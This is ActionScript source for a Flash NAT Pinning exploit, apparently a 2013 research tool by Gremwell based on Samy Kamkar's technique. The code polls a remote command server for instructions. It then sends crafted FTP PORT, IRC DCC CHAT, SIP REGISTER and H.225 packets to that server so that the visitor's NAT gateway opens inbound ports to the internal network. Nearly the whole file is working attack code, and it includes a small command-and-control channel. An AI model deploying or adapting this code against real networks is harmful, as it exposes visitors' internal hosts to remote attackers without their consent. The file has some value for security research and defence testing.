//
//filename=exploit.as
//
//
// Copyright Gremwell,2013
// Author: Raf Somers
// Based on the original NATPinning idea of Samy Kamkar,2010 http://samy.pl/natpin/
// License: GNU General Public License, version 3
//
// 	compiled with as3compile
//	as3compile exploit.as -o exploit.swf
package {
	import flash.display.MovieClip;
	import flash.net.Socket;
	import flash.events.*;
	import flash.system.Security;
	import flash.external.*; 
	import flash.system.Capabilities;
	import flash.utils.Timer;
	import flash.utils.ByteArray; 
	import flash.net.URLLoader;
	import flash.net.URLRequest;
	import flash.net.navigateToURL;
	import flash.external.ExternalInterface;
	import flash.text.TextField;
	import flash.text.TextFormat;
	
	public class Main extends MovieClip {
		static var socket:Socket
		static var socketCMD:Socket
		var sServer:String
		var sCMDUrl:String
		var iServerPort:int
		var sCallbackPort:String
		var sCallbackIP:String
		var sClientId:String
		var sTestID:String
		var timer : Timer
		var myText:TextField = new TextField();
		var URLLoad:URLLoader = new URLLoader();
      		function Main() {
			//get external vars
			sServer = root.loaderInfo.parameters.server as String;
			sCMDUrl =root.loaderInfo.parameters.cmdURL as String
			sClientId = root.loaderInfo.parameters.ci as String;
			createLogger();
			if (sClientId !=null && sCMDUrl!=null&&sServer!=null){
				URLLoad.addEventListener( Event.COMPLETE, onCompletePoll );
    				URLLoad.addEventListener(IOErrorEvent.IO_ERROR, onIOErrorPoll);
				URLLoad.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecurityErrorPoll);
				//move this to reg complete
				timer = new Timer (1500);
				timer.addEventListener (TimerEvent.TIMER, sendPOLL);//send poll request every 1.5 seconds
				timer.start();
			}else{
				log("Input error, this file requires the server,cmdURL and ci parameters.");
			}
		}
		function createLogger():void{
			myText.text = "";
			myText.height=540;
			myText.width=740;
			myText.x=5;
			myText.y=5;
			var format:TextFormat = new TextFormat();
			format.size = 8;
			format.color=0xFFFF00;
			format.font = "_sans";
			//format.bold=true;
			myText.defaultTextFormat = format;
			myText.setTextFormat(format);
			myText.background = true;
			myText.backgroundColor = 0x000000; 
			addChild(myText);
			log("WARNING: This page will actively attempt to create venues for attack on your network.");
			log("If you visited this page by accident, or were manipulated into opening this page, close it now.");
			log("");
			log("     ----- Natpinning v1.0 -----      ");
			log("Only recent log items are found here, for full ouput history check you're browser's console.");

		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START COMMAND CHANNEL +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function sendPOLL(event:Event):void{
			try{
				var tm:Number = new Date().getTime();
				var urlReq:URLRequest = new URLRequest(sCMDUrl+"?cmd=POLL&ci="+sClientId+"&ts="+tm);
				URLLoad.load(urlReq);
				log(sCMDUrl+"?cmd=POLL&ci="+sClientId+"&ts="+tm);
				//when load is completed onComletePoll is fired
			} catch (e:Error) {
				sendError(e);
				log("Error in sendPoll");
			}
		}
		function sendError(error:Error):void{
			try{
				log("# sendError(): " + error.toString());
				//URLLoad.load(sServer+"/cli?ERROR_" + sClientId + "_" + error.toString().encode("base64"));
			} catch (e:Error) {
				//pass
			}
		}
		private function onSecurityErrorPoll(error:Error):void {
			log("Security Error: " + or.toString());
		}	
		private function onCompletePoll (event:Event):void {
        		var loader:URLLoader = URLLoader(event.target);
        		var data:String = strip(loader.data);
			log("Poll result" + data);
			var dataparts:Array = data.split(" ");
			if(dataparts[0]!="0" && dataparts[0]!="ERROR"){
				switch(dataparts[0]){
					case "TEST":
						log("TESTING: " + data);
						sCallbackIP = dataparts[2];
						sCallbackPort = dataparts[3];
						sTestID = dataparts[4];
						switch(dataparts[1]){
							case "FTP":
								timer.stop();
								startFTP();
								break;
							case "IRC":
								timer.stop();
								startIRC();
								break;
							case "SIP":
								timer.stop();
								startSIP();
								break;
							case "H225":
								timer.stop();
								startH225();
								break;
							default:
								log("> CMD: Received invalid test protocol: " + dataparts[1]);
								break;
						}
						break;
					case "RELOAD":
						//reload the current page
						var request:URLRequest = new URLRequest(loaderInfo.loaderURL);
						try {
							navigateToURL(request, '_self');
							break;
						} catch (e:Error) {
							break;
						}
					default:
						log("> CMD: Invalid server command: " + data);
						break;
				}
    			}
		}
 
		private function onIOErrorPoll(event:IOErrorEvent):void {
			//Server might be down, have a bug in the page or the URL might not exist,
			trace("Error loading URL.");
   		}
		function log(data:String):void{
			try{
				var split:Array = myText.text.split("  ");
				if(split.length>=30){
					myText.text = trim(data);
				} else {
					myText.text = myText.text +"  \n" + trim(data);
				}
				ExternalInterface.call("console.log", "Flash:" + data);
			} catch(e:Error){
				//ignore
			}
		}
		function trim(s:String ):String{
  			return s.replace(/^[\s|"]+|[\s|"]+$/gs, '');
		}

		function onConnectCMD(e:Event):void{
			log("> CMD: Connected to Command Server")
			socketCMD.writeUTFBytes("REG " + sCallbackIP + "\n");
		}
	
		function onCloseCMD(e:Event):void {
			// Security error is thrown if this line is excluded
			socketCMD.close();
		}
		public static function createGUID():String {
			var uid:Array = new Array();
			var chars:Array = new Array( 48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70 );
			var separator:uint = 45;
			var template:Array = new Array( 8,4,4,4,12 );
     			
			for ( var a:uint = 0; a < template.length; a++ ) {
				for ( var b:uint = 0; b < template[a]; b++ ) {
					uid.push( chars[ Math.floor( Math.random() *  chars. length ) ] );
        			}
				if ( a < template.length - 1 ) {
					//uid.push( separator );
				}
			}
     
		    return String.fromCharCode.apply( null, uid );
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ END COMMAND CHANNEL +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START FTP +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function startFTP():void{
			log("Starting FTP Test for " + sCallbackIP);
			socket = new Socket();
			socket.addEventListener(Event.CONNECT, onConnectFTP);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponseFTP)
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);;
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socket.connect(sServer,21);
		}
		function onConnectFTP(e:Event):void {
			log("> FTP: Connected to " + sServer);
		}
		function onResponseFTP(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable);
				log("> FTP: in: " + data);
				data = data.substr(0,3)
				if (data=="220"){socket.writeUTFBytes("USER " + sTestID + "\r\n");socket.flush();}
				if (data=="331"){socket.writeUTFBytes("PASS natpin@work.net\r\n");socket.flush();}
				//logged in
				if (data=="230"){
					log("PORT " + sCallbackIP.split(".").join(",") + "," + calcFTPPort(int(sCallbackPort)) + "\r\n");
					var portcmd = "PORT " + sCallbackIP.split(".").join(",") + "," + calcFTPPort(int(sCallbackPort)) + "\r\n";
					socket.writeUTFBytes(portcmd);
					socket.flush();
					log( "> FTP: PORT Command sent");
				}
				if (data=="200"){
					//port command succesfull, send list command
					socket.writeUTFBytes("LIST\r\n");
					socket.flush();
					timer.start();
				}
				if (data=="500"){
					log("# FTP: Server returned 500 message...");
					timer.start();
				}
			}
		}
		function calcFTPPort(port:int):String{
			try{
				var result:String ="";
				var x:int = port%256;
				var y:int = (port -x)/256;
				result = String(y) + "," + String(x);
				return result;
			} catch (e:Error){
				sendError(e);
			}
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START IRC +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function startIRC():void{
			socket = new Socket();
			socket.addEventListener(Event.CONNECT, onConnectIRC);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponseIRC)
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);;
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socket.connect(sServer,6667);
		}
		function onConnectIRC(e:Event):void {
			log("> IRC: Connected to " + sServer);
		}
		function onResponseIRC(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable);
				// init
				if (data.indexOf("NOTICE")>0){socket.writeUTFBytes("NICK natpin\nUSER natpin natpin 127.0.0.1:natpin\n")};socket.flush()
				//end of motd
				if (data.indexOf("376")>0){
					socket.writeUTFBytes("PRIVMSG "+ sTestID + " :\1DCC CHAT chat "+ dot2num(sCallbackIP) +" "+ sCallbackPort+"\1\n")};socket.flush();
					log("> IRC: PRIVMSG send.")
					timer.start();
			}
		}
		function dot2num(ip:String):String {
	    		var long:Number = 0.0;
			var num_arr:Array = ip.split(".");
			for (var i:Number = 0; i < 4; i++)
	    		{
	        		long *= 256.0;
	        		long += parseInt(num_arr[i]);
	    		}
		    return String(long);
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START SIP +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function startSIP():void{
			log("> SIP: Starting SIP Test for " + sCallbackIP);
			socket = new Socket();
			socket.addEventListener(Event.CONNECT, onConnectSIP);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponseSIP);
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);;
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socket.connect(sServer,5060);
		}
		function onConnectSIP(e:Event):void {
			log("> SIP: Connected to " + sServer);
			var register:String = "REGISTER sip:$callbackip$ SIP/2.0\nCSeq: 1 REGISTER\nVia: SIP/2.0/TCP $callbackip$:$callbackport$;branch=$testid$;rport\nUser-Agent: Ekiga/3.2.5\nFrom: <sip:$clientid$@$callbackip$>;tag=d60e6131-99e1-de11-8845-080027608325\nCall-ID: e4ec6031-99e1-de11-8845-080027608325@vvt-laptop\nTo: <sip:13@10.10.1.99>\nContact: <sip:$clientid$@$callbackip$>;q=1\nAllow: INVITE,ACK,OPTIONS,BYE,CANCEL,SUBSCRIBE,NOTIFY,REFER,MESSAGE,INFO,PING\nExpires: 3600\nContent-Length: 0\nMax-Forwards: 70\n";
			register = register.split("$callbackip$").join(sCallbackIP);
			register = register.split("$callbackport$").join(sCallbackPort);
			register = register.split("$clientid$").join(sClientId);
			register = register.split("$testid$").join(sTestID);
			socket.writeUTFBytes(register);socket.flush();
			timer.start();
		}
		function onResponseSIP(e:ProgressEvent):void {

		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START H225 +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function startH225():void {
			socket = new Socket();
			socket.addEventListener(Event.CONNECT, onConnectH225);
			/*socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponse)
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);;
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);*/
			socket.connect(sServer,1720);
			
		}
		function onConnectH225(e:Event):void {
			log("> H.225:  Connected to " + sServer);
			try{
				var Q931_TYPE_CNNCT:String = "07";
				var Q931_DATA:String = "f7 f4" + " " + Q931_TYPE_CNNCT; //message ref + type
				var Q931_Info_Display:String = "28" + " " + sTestID.length.toString(16) + " " + string2hex(sTestID); // byte1:type + byte2:length of element + element data
				Q931_DATA=  Q931_DATA + " " + Q931_Info_Display + " " + "7e 00 4c 05";
				var Q931:String ="08 02" + " " +Q931_DATA;

 				var H225_PROTO:String = "00 08 91 4a 00 03";
				var H255_ADDRESS:String = "00" + " " + ip2hex(sCallbackIP) + " " + port2hex(sCallbackPort); // TYPE6IP + IP_ADDRESS + PORT
				var H225_DESTINFO:String = "22 c0 00 00 00 00 03 33 31 30 69 00 52";

				var H225_CONFID:String = "f8 fd f9 3e cd 9e d6 11 9a b2 00 04 76 22 20 17 17 0c 00 11";
				var H225_CALLID:String = "c0 fe f9 3e cd 9e d6 11 9a b2 00 04 76 22 20 17";
				var H225_MULTIPLECALLS:String="01 00"; //length=1, value=false
				var H225_MAINTAIN:String="01 00"; //length=1, value=false

				var H225:String ="22 c0 06" + " " + H225_PROTO + " " + H255_ADDRESS + " " + H225_DESTINFO + " 00 " + H225_CONFID + " 00 " + H225_CALLID + " " + H225_MULTIPLECALLS + " " + H225_MAINTAIN + " 08 80 01 00";
				//wrap everything in TPKT
				var TPKT:String = "03 00 00 00"; //type TPKT + LENGTH
				var packet:String = TPKT + " " + Q931 + " " + H225;
				packet = updateTPTKLength(packet)
				//var packet_len:int = ((packet.length +1)/3); //actual length + trailing space, deviced by 3 (hex string=2chars + space) 
				//packet = packet.replace("XX",packet_len.toString(16));

				var packet_bytes:ByteArray = new ByteArray();
				for each (var s:String in packet.split(" "))
					{
						packet_bytes.writeByte(parseInt(s, 16));
					}

				socket.writeBytes(packet_bytes);socket.flush();
				log("> H.225:  Send Connect packet.")
				timer.start();
			} catch (e:Error){
				sendError(e);
				timer.start();
			}
		}
		function updateTPTKLength(packet:String):String{
			var arrPacket:Array = packet.split(" ");
			var packet_len:int = arrPacket.length;
			var result:String = "";
			var intloc:int = 0;
			for each(var s:String in arrPacket){
				if (intloc>0){result=result+" ";};
				if (intloc==3){
					result = result + packet_len.toString(16);
				}else{
					result = result + s;
				}
				intloc = intloc + 1
			}
			//log("H225 packet Size: " + packet_len.toString(10) + ":" + packet_len.toString(16));
			return result
		}
		function string2hex(sData:String):String{
			var sResult:String ="";
			var iCharCode:int=0;
			for each (var s:String in sData.split("")){
				iCharCode = s.charCodeAt(0)
				if (sResult != ""){sResult = sResult + " ";}
				sResult = sResult + iCharCode.toString(16);
			}
			//log(sResult);
			return sResult;
		}
		function ip2hex(ip:String):String{
			var result:String = "";
			var ippart:int = 0;
			var stmp:String = "";
			for each (var s:String in ip.split("."))
				{
					ippart = int(s);
					if (result != ""){result =result + " ";}
					stmp = ippart.toString(16);
					if (stmp.length==1){stmp = "0"+stmp;}
					result = result + stmp;
				}
			return result;
		}
		function port2hex(port:String):String{
			var iPort:int = int(port);
			var sPort:String = iPort.toString(16);
			var aPort:Array = sPort.split("");
			if (sPort.length==2){
				sPort = "00 " + sPort
			}else{
				sPort = aPort[0] + aPort[1] + " " + aPort[2] + aPort[3]
			}
			return sPort;
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START ALL_PROTO +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function onConnect(e:Event):void {
			log("connected")
		}

		function onClose(e:Event):void {
			// Security error is thrown if this line is excluded
			socket.close();
		}

		function onError(e:IOErrorEvent):void {
			sendError("IO Error: "+e);
		}

		function onSecError(e:SecurityErrorEvent):void {
			sendError("Security Error: "+e);
		}

		function onResponse(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable)
			}
		}

		function calcFTP(port,ip):String{
		}
		function calcIRC(port,ip):String{
		}
		function strip(val:String):String{
			var x:String = val
			x = x.split("\n").join("")
			x.split("\r").join("")
			return x
		}
	}
}
